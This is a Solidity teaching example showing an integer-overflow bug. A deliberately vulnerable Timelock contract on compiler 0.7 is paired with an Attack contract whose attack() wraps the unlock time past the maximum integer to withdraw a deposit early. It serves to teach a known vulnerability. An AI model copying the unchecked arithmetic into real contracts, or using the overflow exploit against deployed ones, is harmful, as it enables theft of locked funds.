// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

/*
Solidity < 0.8
Integers in Solidity overflow / underflow without any errors

Solidity >= 0.8
Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.

This contract is designed to act as a time vault.
User can deposit into this contract but cannot withdraw for atleast a week.
User can also extend the wait time beyond the 1 week waiting period.

1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.timevault to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract Timelock {
    mapping(address => uint) public balances;
    mapping(address => uint) public timevault;

    function deposite() public payable {
        balances[msg.sender] += msg.value;
        timevault[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseTime(uint _time) public {
        timevault[msg.sender] += _time;
    }

    function withdraw() public payable {
        require(balances[msg.sender] > 0, "Not enough deposite");
        require(timevault[msg.sender] < block.timestamp, "You need to wait");
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{ value: amount }("");
        require(success, "Transaction failed");
    }
}

contract Attack {
    Timelock tm;

    constructor(address _address) {
        tm = Timelock(_address);
    }

    fallback() external payable {}

    function attack() public payable {
        tm.deposite{ value: msg.value }();
        // overflow - stored time
        tm.increaseTime(type(uint).max + 1 - tm.timevault(address(this)));
        tm.withdraw();
    }

    function deposite() public payable {
        tm.deposite{ value: msg.value }();
    }

    function test() public view returns(uint, uint, uint, uint) {
        return (type(uint).max, type(uint).max + 1, tm.timevault(address(this)), type(uint).max + 1 - tm.timevault(address(this)));
    }
}